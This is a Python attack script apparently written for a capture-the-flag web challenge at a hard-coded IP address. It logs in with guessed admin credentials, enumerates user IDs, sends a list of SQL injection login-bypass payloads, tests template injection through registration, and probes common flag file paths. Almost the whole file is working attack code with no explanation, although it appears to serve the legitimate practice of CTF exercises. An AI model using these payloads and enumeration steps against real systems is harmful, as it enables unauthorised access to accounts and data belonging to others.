"""
Systematic attack on exam-web06 (183.129.189.62:21313)
Goal: find the flag
"""
import requests
import string

BASE = "http://183.129.189.62:21313"

s = requests.Session()

# Login as admin
r = s.post(f"{BASE}/login", data={'username': 'admin', 'password': 'admin123'}, allow_redirects=False)
print(f"Admin login: {'OK' if 'Redirecting' in r.text else 'FAIL'}")

# 1. Check ALL user IDs for flag
print("\n=== Checking all user IDs for flag ===")
for uid in range(0, 200):
    r = s.get(f"{BASE}/info?id={uid}", cookies=s.cookies)
    if '不存在' not in r.text and '无效' not in r.text:
        if 'flag' in r.text.lower() or ('普通用户' not in r.text and 'ID:' in r.text):
            print(f"ID {uid}: SPECIAL - {r.text[:200]}")
            
print("\n=== Testing Blind SQL Injection (different approaches) ===")

# 2. Test SQL injection with different techniques
for username in [
    "admin'--",                    # Works
    "admin'/*",
    "admin'||1#",                  # OR alternative
    "admin'&&1=1#",                # AND alternative  
    "'OR 1=1--",                   # Empty username OR
    "1'OR'1'='1'--",              # Classic OR
    "admin'%0aOR%0a1=1--",        # Newline
]:
    r = requests.post(f"{BASE}/login", 
                      data={'username': username, 'password': 'test'},
                      allow_redirects=False)
    if 'Redirecting' in r.text:
        print(f"WORKS: {username!r}")

# 3. Test for SSTI in different contexts
print("\n=== Testing SSTI contexts ===")

# Test SSTI in various places
import random
rand = str(random.randint(10000, 99999))
ssti_tests = [
    ('register', {'username': f'hzr_ssti_{rand}', 'password': '{{7*777}}'}),
]

for context, data in ssti_tests:
    r = requests.post(f"{BASE}/register", data=data, allow_redirects=False)
    if r.status_code == 302:
        print(f"{context} OK - checking for SSTI eval")
        # Login and check
        s2 = requests.Session()
        r2 = s2.post(f"{BASE}/login", 
                     data={'username': data['username'], 'password': data['password']},
                     allow_redirects=False)
        if 'Redirecting' in r2.text:
            r3 = s2.get(f"{BASE}/info", cookies=s2.cookies)
            print(f"  Info: {r3.text[:200]}")

# 4. Try to directly access flag via common paths
print("\n=== Trying common flag paths ===")
for path in ['/flag', '/flag.txt', '/getflag', '/api/flag', '/readflag', 
             '/static/flag.txt', '/templates/flag.txt', '/app/flag']:
    r = s.get(f"{BASE}{path}", cookies=s.cookies)
    if r.status_code != 404:
        print(f"{path}: {r.status_code} - {r.text[:100]}")

print("\nDone!")
